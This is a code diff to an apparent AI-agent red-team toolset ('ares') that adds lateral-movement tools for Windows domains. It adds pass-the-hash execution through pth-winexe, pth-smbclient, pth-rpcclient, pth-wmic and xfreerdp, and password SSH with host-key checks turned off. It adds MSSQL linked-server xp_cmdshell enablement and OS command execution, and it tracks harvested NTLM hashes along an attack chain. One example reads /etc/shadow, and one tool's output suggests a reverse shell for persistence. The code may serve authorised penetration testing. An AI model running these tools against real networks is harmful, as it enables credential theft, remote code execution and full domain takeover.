@@ -7,23 +7,22 @@ This module provides toolsets for:
 - MSSQL attacks
 """
 
-import logging
 import re
 from typing import ClassVar
 
 import dreadnode as dn
 from dreadnode.agent.tools.base import Toolset
+from loguru import logger
 
 from ares.core.models import Hash, SharedRedTeamState
 from ares.tools.red.common import (
     PLACEHOLDER_PASSWORDS,
     AnyRedTeamState,
     check_port,
+    get_credential_context,
     resolve_password,
     run_tool,
 )
-
-logger = logging.getLogger(__name__)
 
 
 class LateralMovementTools(Toolset):
@@ -71,7 +70,8 @@ class LateralMovementTools(Toolset):
             cmd.extend(["-d", domain])
         cmd.extend(["-x", "whoami"])
         try:
-            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            # netexec is only installed on RECON pods - route there
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120, target_role="recon")
         except Exception:
             return None
         output = (stdout or "") + ("\n" + stderr if stderr else "")
@@ -214,7 +214,7 @@ class LateralMovementTools(Toolset):
         if hash:
             cmd.extend(["-hashes", f":{hash}"])
 
-        cmd.extend(["-c", command])
+        cmd.append(command)
 
         try:
             logger.info(f"[*] Executing via PsExec on {target}")
@@ -317,7 +317,7 @@ class LateralMovementTools(Toolset):
 
         Args:
             username: Username to request TGT for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             password: Password for authentication (optional if using hash)
             hash: NTLM hash for authentication (optional if using password)
             dc_ip: Domain controller IP address (optional)
@@ -326,8 +326,8 @@ class LateralMovementTools(Toolset):
             Path to .ccache file or error message
 
         Example:
-            >>> get_tgt("admin", "domain.local", password="pass")  # pragma: allowlist secret
-            >>> get_tgt("admin", "domain.local", hash="aad3b435...")
+            >>> get_tgt("admin", "contoso.local", password="pass")  # pragma: allowlist secret
+            >>> get_tgt("admin", "contoso.local", hash="aad3b435...")
         """
         if not (password or hash):
             return "[!] Error: Either password or hash must be provided"
@@ -400,9 +400,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami && hostname)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -412,8 +412,8 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> psexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
-            >>> psexec_kerberos("dc01.domain.local", "admin", "domain.local", ticket_path="admin.ccache")
+            >>> psexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
+            >>> psexec_kerberos("dc01.contoso.local", "admin", "contoso.local", ticket_path="admin.ccache")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -430,7 +430,7 @@ class LateralMovementTools(Toolset):
             cmd.extend(["-dc-ip", dc_ip])
         if target_ip:
             cmd.extend(["-target-ip", target_ip])
-        cmd.extend(["-c", command])
+        cmd.append(command)
 
         # Prepend KRB5CCNAME environment variable
         cmd = ["env", f"KRB5CCNAME={actual_ticket}"] + cmd
@@ -467,9 +467,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -479,7 +479,7 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> wmiexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> wmiexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -532,9 +532,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             command: Command to execute (default: whoami)
             dc_ip: Domain controller IP for Kerberos (optional)
@@ -543,7 +543,7 @@ class LateralMovementTools(Toolset):
             Command output or error message
 
         Example:
-            >>> smbexec_kerberos("dc01.domain.local", "Administrator", "domain.local")
+            >>> smbexec_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -596,9 +596,9 @@ class LateralMovementTools(Toolset):
         IMPORTANT: Kerberos requires FQDN hostname, not IP address.
 
         Args:
-            target: Target FQDN (e.g., 'dc01.domain.local') - NOT an IP address
+            target: Target FQDN (e.g., 'dc01.contoso.local') - NOT an IP address
             username: Username the ticket was issued for (e.g., 'Administrator')
-            domain: Domain name (e.g., 'domain.local')
+            domain: Domain name (e.g., 'contoso.local')
             ticket_path: Path to .ccache ticket file (default: {username}.ccache)
             dc_ip: Domain controller IP for Kerberos (optional)
             target_ip: Target IP address to connect to (overrides DNS resolution)
@@ -608,8 +608,8 @@ class LateralMovementTools(Toolset):
             Extracted credentials including NTLM hashes, Kerberos keys, and secrets
 
         Example:
-            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local")
-            >>> secretsdump_kerberos("dc01.domain.local", "Administrator", "domain.local", ticket_path="Administrator.ccache")
+            >>> secretsdump_kerberos("dc01.contoso.local", "Administrator", "contoso.local")
+            >>> secretsdump_kerberos("dc01.contoso.local", "Administrator", "contoso.local", ticket_path="Administrator.ccache")
         """
         # Validate target is FQDN (Kerberos requires hostname, not IP)
         if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
@@ -672,9 +672,25 @@ class LateralMovementTools(Toolset):
 
         This triggers real-time Redis checkpoint so the orchestrator sees hashes
         without waiting for task completion.
+
+        Uses the current credential context (set via set_credential_context) to
+        establish parent_id linkage for attack chain tracking.
         """
         if not output:
             return
+
+        # Get credential context for attack chain tracking
+        ctx = get_credential_context()
+        parent_id = ctx.parent_id
+        attack_step = ctx.attack_step + 1 if ctx.parent_id else 0
+
+        # Build source string that captures the attack path
+        if ctx.impersonated_user and ctx.impersonation_method:
+            source = f"secretsdump:via_{ctx.impersonation_method}:{ctx.impersonated_user}"
+        elif ctx.source_username:
+            source = f"secretsdump:{ctx.source_domain}\\{ctx.source_username}"
+        else:
+            source = "secretsdump"
 
         extracted = 0
         guest_null_hash = "31d6cfe0d16ae931b73c59d7e0c089c0"  # pragma: allowlist secret
@@ -715,7 +731,9 @@ class LateralMovementTools(Toolset):
                 hash_value=f"{lm_hash}:{nt_hash}",
                 hash_type="NTLM",
                 domain=h_domain,
-                source="secretsdump",
+                source=source,
+                parent_id=parent_id,
+                attack_step=attack_step,
             )
 
             if isinstance(self.state, SharedRedTeamState):
@@ -726,20 +744,345 @@ class LateralMovementTools(Toolset):
                 extracted += 1
 
         if extracted:
-            logger.warning(
-                f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump into state"
-            )
+            # Log with context about the attack path
+            if ctx.impersonated_user:
+                logger.warning(
+                    f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump "
+                    f"(via {ctx.impersonation_method} as {ctx.impersonated_user})"
+                )
+            else:
+                logger.warning(
+                    f"[+] Auto-extracted {extracted} NTLM hashes from secretsdump into state"
+                )
             # Record NTDS dump as a weakness
             if isinstance(self.state, SharedRedTeamState):
+                discovery_method = "secretsdump"
+                if ctx.impersonated_user:
+                    discovery_method = f"secretsdump (via {ctx.impersonation_method} impersonating {ctx.impersonated_user})"
+                elif ctx.source_username:
+                    discovery_method = (
+                        f"secretsdump (using {ctx.source_domain}\\{ctx.source_username})"
+                    )
+
                 self.state.add_weakness(
                     f"### Full NTDS.DIT dump — {extracted} NTLM hashes extracted\n"
                     f"**Vulnerability:** Secretsdump successfully dumped {extracted} "
                     f"NTLM hashes from a domain controller, exposing all domain credentials.\n"
                     f"- **Affected Resource:** {domain} domain controller\n"
-                    f"- **Discovery Method:** secretsdump (Kerberos auth via S4U/pass-the-ticket)\n"
+                    f"- **Discovery Method:** {discovery_method}\n"
                     f"- **Impact:** All domain user password hashes compromised. "
                     f"Enables pass-the-hash, golden ticket, and complete domain takeover."
                 )
+
+    # ===================
+    # Pass-the-Hash Tools
+    # ===================
+
+    @dn.tool_method
+    def pth_winexe(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        command: str = "cmd.exe /c whoami && hostname",
+    ) -> str:
+        """
+        Execute command via pass-the-hash using pth-winexe.
+
+        Alternative to impacket psexec/wmiexec when they fail.
+        Uses the passing-the-hash toolkit.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            command: Command to execute
+
+        Returns:
+            Command output from target
+
+        Example:
+            >>> pth_winexe("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", "contoso.local")
+        """
+        user_spec = f"{domain}/{username}" if domain else username
+        cmd = [
+            "pth-winexe",
+            f"--user={user_spec}",
+            f"--hash={hash}",
+            f"//{target}",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Executing via pth-winexe on {target}")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0 or username.lower() in result.lower():
+                logger.info(f"[+] pth-winexe to {target} successful!")
+
+            return result
+
+        except Exception as e:
+            return f"pth-winexe failed: {e}"
+
+    @dn.tool_method
+    def pth_smbclient(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        share: str = "C$",
+        command: str = "dir",
+    ) -> str:
+        """
+        Access SMB shares via pass-the-hash using pth-smbclient.
+
+        Useful for file operations when impacket smbclient is unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            share: SMB share to access (default: C$)
+            command: smbclient command to run (default: dir)
+
+        Returns:
+            smbclient output
+
+        Example:
+            >>> pth_smbclient("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", share="SYSVOL")
+        """
+        user_spec = f"{domain}/{username}" if domain else username
+        cmd = [
+            "pth-smbclient",
+            f"--user={user_spec}",
+            f"--hash={hash}",
+            f"//{target}/{share}",
+            "-c",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Accessing {target}/{share} via pth-smbclient")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-smbclient failed: {e}"
+
+    @dn.tool_method
+    def pth_rpcclient(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        command: str = "enumdomusers",
+    ) -> str:
+        """
+        Execute RPC commands via pass-the-hash using pth-rpcclient.
+
+        Useful for enumeration and recon with hash-based auth.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            command: RPC command to run (default: enumdomusers)
+
+        Returns:
+            rpcclient output
+
+        Example:
+            >>> pth_rpcclient("192.168.58.10", "Administrator", "aad3b435...:31d6cfe0...", command="enumdomgroups")
+        """
+        user_spec = f"{domain}/{username}%{hash}" if domain else f"{username}%{hash}"
+        cmd = ["pth-rpcclient", "-U", user_spec, target, "-c", command]
+
+        try:
+            logger.info(f"[*] Running rpcclient on {target} via PTH")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-rpcclient failed: {e}"
+
+    @dn.tool_method
+    def pth_wmic(
+        self,
+        target: str,
+        username: str,
+        hash: str,
+        domain: str | None = None,
+        query: str = "SELECT * FROM Win32_OperatingSystem",
+    ) -> str:
+        """
+        Execute WMI queries via pass-the-hash using pth-wmic.
+
+        Useful for remote enumeration when impacket wmiexec is unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            hash: NTLM hash (LM:NT or just NT)
+            domain: Domain for authentication (optional)
+            query: WMI query to execute
+
+        Returns:
+            WMI query results
+
+        Example:
+            >>> pth_wmic("192.168.58.22", "Administrator", "aad3b435...:31d6cfe0...", query="SELECT * FROM Win32_Process")
+        """
+        user_spec = f"{domain}/{username}%{hash}" if domain else f"{username}%{hash}"
+        cmd = [
+            "pth-wmic",
+            "-U",
+            user_spec,
+            f"//{target}",
+            query,
+        ]
+
+        try:
+            logger.info(f"[*] Running WMI query on {target} via PTH")
+            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
+            return stdout + "\n" + (stderr or "")
+
+        except Exception as e:
+            return f"pth-wmic failed: {e}"
+
+    # ===================
+    # RDP and SSH Tools
+    # ===================
+
+    @dn.tool_method
+    def xfreerdp(
+        self,
+        target: str,
+        username: str,
+        password: str | None = None,
+        hash: str | None = None,
+        domain: str | None = None,
+        command: str | None = None,
+    ) -> str:
+        """
+        RDP connection with pass-the-hash support via xfreerdp.
+
+        Use for RDP access when WinRM/SMB exec are blocked.
+        With hash: uses Restricted Admin mode (must be enabled on target).
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for authentication
+            password: Password (optional if using hash)
+            hash: NTLM hash for Restricted Admin PTH (optional)
+            domain: Domain for authentication (optional)
+            command: Command to run (if None, verifies connection only)
+
+        Returns:
+            RDP connection result
+
+        Example:
+            >>> xfreerdp("192.168.58.22", "Administrator", password="pass")  # pragma: allowlist secret
+            >>> xfreerdp("192.168.58.22", "Administrator", hash="31d6cfe0...")
+        """
+        if not (password or hash):
+            return "[!] Error: Either password or hash required"
+
+        cmd = ["xfreerdp", f"/v:{target}", f"/u:{username}", "/cert:ignore"]
+
+        if domain:
+            cmd.append(f"/d:{domain}")
+
+        if hash:
+            # Restricted Admin mode with PTH
+            cmd.extend([f"/pth:{hash}", "/restricted-admin"])
+        else:
+            cmd.append(f"/p:{password}")
+
+        if command:
+            # Non-interactive: run command and exit
+            cmd.extend(["/app:cmd.exe", f"/app-cmd:/c {command}", "/timeout:30000"])
+        else:
+            # Interactive session check (just verify connection)
+            cmd.extend(["/app:cmd.exe", "/app-cmd:/c whoami", "/timeout:10000"])
+
+        try:
+            logger.info(f"[*] Connecting to {target} via RDP")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                result = f"[+] RDP connection to {target} successful!\n" + result
+
+            return result
+
+        except Exception as e:
+            return f"xfreerdp failed: {e}"
+
+    @dn.tool_method
+    def ssh_with_password(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        command: str = "id && hostname",
+        port: int = 22,
+    ) -> str:
+        """
+        SSH with password authentication using sshpass.
+
+        Use for Linux/Unix lateral movement when SSH keys are unavailable.
+
+        Args:
+            target: Target machine IP or hostname
+            username: Username for SSH authentication
+            password: Password for authentication
+            command: Command to execute on remote host
+            port: SSH port (default: 22)
+
+        Returns:
+            Command output from remote host
+
+        Example:
+            >>> ssh_with_password("192.168.58.50", "root", "toor", "cat /etc/shadow")  # pragma: allowlist secret
+        """
+        cmd = [
+            "sshpass",
+            "-p",
+            password,
+            "ssh",
+            "-o",
+            "StrictHostKeyChecking=no",
+            "-o",
+            "UserKnownHostsFile=/dev/null",
+            "-p",
+            str(port),
+            f"{username}@{target}",
+            command,
+        ]
+
+        try:
+            logger.info(f"[*] Connecting to {target} via SSH")
+            stdout, stderr, returncode = run_tool(cmd, timeout_seconds=60)
+
+            result = stdout + "\n" + (stderr or "")
+
+            if returncode == 0:
+                result = f"[+] SSH to {target} successful!\n" + result
+
+            return result
+
+        except Exception as e:
+            return f"SSH with password failed: {e}"
 
 
 class MSSQLTools(Toolset):
@@ -829,7 +1172,7 @@ class MSSQLTools(Toolset):
             xp_cmdshell enablement result
 
         Example:
-            >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enable_xp_cmdshell("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -892,7 +1235,7 @@ RECONFIGURE;
             List of users that can be impersonated
 
         Example:
-            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -917,15 +1260,44 @@ WHERE a.permission_name = 'IMPERSONATE';
             result = stdout + "\n" + (stderr or "")
 
             # Check if we found impersonatable users
-            if "impersonatableuser" in result.lower() and (
+            has_sa = "impersonatableuser" in result.lower() and (
                 "sa" in result.lower() or "admin" in result.lower() or "dbo" in result.lower()
-            ):
+            )
+
+            if has_sa:
                 logger.warning("[!] High-value impersonation targets found!")
                 result = (
                     "🚨 IMPERSONATION TARGETS FOUND!\n"
                     "\u2192 Use mssql_impersonate to execute queries as these users\n"
                     "\u2192 Target 'sa' or admin accounts for sysadmin access\n\n" + result
                 )
+
+                # Auto-record vulnerability with can_impersonate_sa for priority boost
+                if isinstance(self.state, SharedRedTeamState):
+                    from ares.core.models import VulnerabilityInfo
+
+                    vuln_id = f"mssql_impersonation_{target}_sa"
+                    if vuln_id not in self.state.discovered_vulnerabilities:
+                        vuln = VulnerabilityInfo(
+                            vuln_id=vuln_id,
+                            vuln_type="mssql_impersonation",
+                            target=target,
+                            discovered_by="mssql_enum_impersonation",
+                            details={
+                                "hostname": target,
+                                "can_impersonate_sa": True,
+                                "username": username,
+                                "password": password,
+                                "domain": domain,
+                                "windows_auth": windows_auth,
+                            },
+                            priority=3,  # Boosted priority for confirmed sa
+                        )
+                        self.state.discovered_vulnerabilities[vuln_id] = vuln
+                        logger.warning(
+                            f"🚀 Auto-queued MSSQL sa impersonation vuln (priority 3) for {target}"
+                        )
+
             elif "impersonatableuser" in result.lower():
                 logger.info("[+] Impersonation rights enumerated")
                 result = (
@@ -972,8 +1344,8 @@ WHERE a.permission_name = 'IMPERSONATE';
             Query result executed as the impersonated user
 
         Example:
-            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "domain.local")  # First enumerate
-            >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "domain.local")
+            >>> mssql_enum_impersonation("192.168.58.22", "user", "pass", "contoso.local")  # First enumerate
+            >>> mssql_impersonate("192.168.58.22", "user", "pass", "sa", "SELECT SYSTEM_USER", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1028,7 +1400,7 @@ WHERE a.permission_name = 'IMPERSONATE';
             List of linked servers with access information
 
         Example:
-            >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "domain.local")
+            >>> mssql_enum_linked_servers("192.168.58.22", "user", "pass", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1093,8 +1465,8 @@ EXEC sp_linkedservers;
             Query result from the linked server
 
         Example:
-            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "domain.local")
-            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "domain.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "SELECT SYSTEM_USER", "contoso.local")
+            >>> mssql_exec_linked("192.168.58.22", "user", "pass", "LINKED_SRV", "EXEC xp_cmdshell 'whoami'", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1155,7 +1527,7 @@ EXEC sp_linkedservers;
             Coercion attempt result
 
         Example:
-            >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "domain.local")
+            >>> mssql_ntlm_coerce("192.168.58.22", "user", "pass", "192.168.58.100", "contoso.local")
         """
         if domain:
             target_string = f"{domain}/{username}:{password}@{target}"
@@ -1184,3 +1556,151 @@ EXEC sp_linkedservers;
 
         except Exception as e:
             return f"MSSQL NTLM coercion failed: {e}"
+
+    @dn.tool_method
+    def mssql_linked_enable_xpcmdshell(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        linked_server: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Enable xp_cmdshell on a linked MSSQL server for command execution.
+
+        Requires sysadmin privileges on the linked server (often mapped as 'sa').
+        After enabling, use mssql_linked_xpcmdshell to execute system commands.
+
+        This is a HIGH-VALUE attack for cross-domain pivoting when the linked
+        server is in a different domain or forest.
+
+        Args:
+            target: Local MSSQL server IP (where you have access)
+            username: Username for local authentication
+            password: Password for authentication
+            linked_server: Name of the linked server to enable xp_cmdshell on
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication (default: True)
+
+        Returns:
+            xp_cmdshell enablement result on the linked server
+
+        Example:
+            >>> mssql_linked_enable_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "contoso.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # nosec B608 - intentional SQL for MSSQL pentest
+        # Enable show advanced options and xp_cmdshell on the linked server
+        enable_queries = [
+            f"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{linked_server}]",
+            f"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}]",
+        ]
+
+        results = []
+        for sql_query in enable_queries:
+            cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+            if windows_auth:
+                cmd_string += " -windows-auth"
+
+            try:
+                stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+                results.append(stdout + "\n" + (stderr or ""))
+            except Exception as e:
+                results.append(f"Error: {e}")
+
+        combined_result = "\n".join(results)
+
+        if (
+            "configuration option" in combined_result.lower()
+            or "changed" in combined_result.lower()
+        ):
+            logger.warning(f"[+] xp_cmdshell enabled on linked server {linked_server}!")
+            return (
+                f"✅ xp_cmdshell ENABLED on linked server {linked_server}!\n"
+                f"→ Use mssql_linked_xpcmdshell to execute OS commands\n"
+                f"→ This enables cross-domain pivoting if linked server is in another domain\n\n"
+                + combined_result
+            )
+
+        return (
+            f"📋 xp_cmdshell enable attempt on {linked_server}\n"
+            f"→ Check output for errors (may need sysadmin on linked server)\n\n" + combined_result
+        )
+
+    @dn.tool_method
+    def mssql_linked_xpcmdshell(
+        self,
+        target: str,
+        username: str,
+        password: str,
+        linked_server: str,
+        command: str,
+        domain: str | None = None,
+        windows_auth: bool = True,
+    ) -> str:
+        """
+        Execute OS command via xp_cmdshell on a linked MSSQL server.
+
+        xp_cmdshell must be enabled first (use mssql_linked_enable_xpcmdshell).
+        This is a HIGH-VALUE attack for cross-domain pivoting.
+
+        Args:
+            target: Local MSSQL server IP (where you have access)
+            username: Username for local authentication
+            password: Password for authentication
+            linked_server: Name of the linked server to execute on
+            command: OS command to execute on the linked server
+            domain: Domain for Windows auth (optional)
+            windows_auth: Use Windows authentication (default: True)
+
+        Returns:
+            Command output from the linked server
+
+        Example:
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "whoami", "contoso.local")
+            >>> mssql_linked_xpcmdshell("192.168.58.22", "user", "pass", "BRAAVOS", "hostname && ipconfig", "contoso.local")
+        """
+        if domain:
+            target_string = f"{domain}/{username}:{password}@{target}"
+        else:
+            target_string = f"{username}:{password}@{target}"
+
+        # Escape single quotes in command for SQL
+        escaped_command = command.replace("'", "''")
+
+        # nosec B608 - intentional SQL for MSSQL pentest
+        sql_query = f"EXEC ('xp_cmdshell ''{escaped_command}''') AT [{linked_server}]"
+
+        cmd_string = f'echo "{sql_query}" | mssqlclient.py {target_string}'
+        if windows_auth:
+            cmd_string += " -windows-auth"
+
+        try:
+            logger.info(f"[*] Executing command on linked server {linked_server}: {command}")
+            stdout, stderr, _ = run_tool(["bash", "-c", cmd_string], timeout_seconds=120)
+
+            result = stdout + "\n" + (stderr or "")
+
+            # Check for successful execution indicators
+            if "nt authority" in result.lower() or "nt service" in result.lower():
+                logger.warning(f"[+] Command execution successful on {linked_server}!")
+                return (
+                    f"🚨 COMMAND EXECUTION ON LINKED SERVER {linked_server}!\n"
+                    f"→ Command: {command}\n"
+                    f"→ Check for domain information to identify pivot opportunities\n"
+                    f"→ Consider reverse shell for persistent access\n\n" + result
+                )
+
+            return (
+                f"📋 Command execution attempted on {linked_server}\n"
+                f"→ Command: {command}\n\n" + result
+            )
+
+        except Exception as e:
+            return f"Linked server xp_cmdshell execution failed: {e}"
